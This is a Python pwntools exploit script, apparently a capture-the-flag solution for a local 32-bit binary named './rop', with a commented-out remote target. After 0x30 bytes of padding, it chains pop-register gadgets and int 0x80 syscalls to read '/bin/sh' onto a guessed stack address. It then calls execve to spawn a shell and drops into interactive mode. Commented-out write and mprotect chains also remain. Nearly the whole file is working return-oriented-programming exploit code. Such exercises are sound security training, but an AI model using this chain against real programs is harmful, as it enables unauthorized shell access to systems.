# -*- coding: utf-8 -*-

from pwn import *

pwnable_filename = "./rop"

def generate_io():
    # Io = remote("192.168.210.11", 10010)
    Io = process(pwnable_filename)
    return Io


pop_eax_ret_addr = 0x0804819c
pop_ebx_ret_addr = 0x0804819e
pop_ecx_ret_addr = 0x080481a0
pop_edx_ret_addr = 0x080481a2
int_80_addr = 0x080480f6
ret_addr = 0x080480fc

junk = "A" * 0x30

mprotect_id = 0x7d
read_id = 0x03
write_id = 0x04
execve_id = 0x0B


size = 0x08
rwx = 0x02

stdin = 0
stdout = 1

stack_addr = 0xffb20000

# print "[+] Trying 0x%08x (%d times)." % (stack_addr, i)

Io = generate_io()

# gdb.attach(proc.pidof(Io)[0], gdbscript='')
Io.read()

# Leak puts got
payload = flat([
    junk,
    # # write(stdout, buffer, size)
    # p32(pop_eax_ret_addr),
    # p32(write_id),
    # p32(pop_ebx_ret_addr),
    # p32(stdout),
    # p32(pop_ecx_ret_addr),
    # p32(stack_addr),
    # p32(pop_edx_ret_addr),
    # p32(size),
    # # p32(ret_addr),
    # p32(int_80_addr),

    # # mprotect(stack_addr, size, rwx)
    # p32(pop_eax_ret_addr),
    # p32(mprotect_id),
    # p32(pop_ebx_ret_addr),
    # p32(stack_addr),
    # p32(pop_ecx_ret_addr),
    # p32(size),
    # p32(pop_edx_ret_addr),
    # p32(rwx),
    # # p32(ret_addr),
    # p32(int_80_addr),

    # read(stdin, stack_addr, 0x08)
    p32(pop_eax_ret_addr),
    p32(read_id),
    p32(pop_ebx_ret_addr),
    p32(stdin),
    p32(pop_ecx_ret_addr),
    p32(stack_addr),
    p32(pop_edx_ret_addr),
    p32(size),
    # p32(ret_addr),
    p32(int_80_addr),

    # execve(stack_addr, 0, 0)
    p32(pop_eax_ret_addr),
    p32(execve_id),
    p32(pop_ebx_ret_addr),
    p32(stack_addr),
    p32(pop_ecx_ret_addr),
    p32(0),
    p32(pop_edx_ret_addr),
    p32(0),
    # p32(ret_addr),
    p32(int_80_addr),
])

Io.sendline(payload)
Io.sendline("/bin/sh\x00")

Io.interactive()

# Io.sendline("/bin/sh\x00\n")
# Io.sendline("id\n\n")
# data = Io.read()
# if data != "Good Luck!\n":
#     print data
#     Io.interactive()
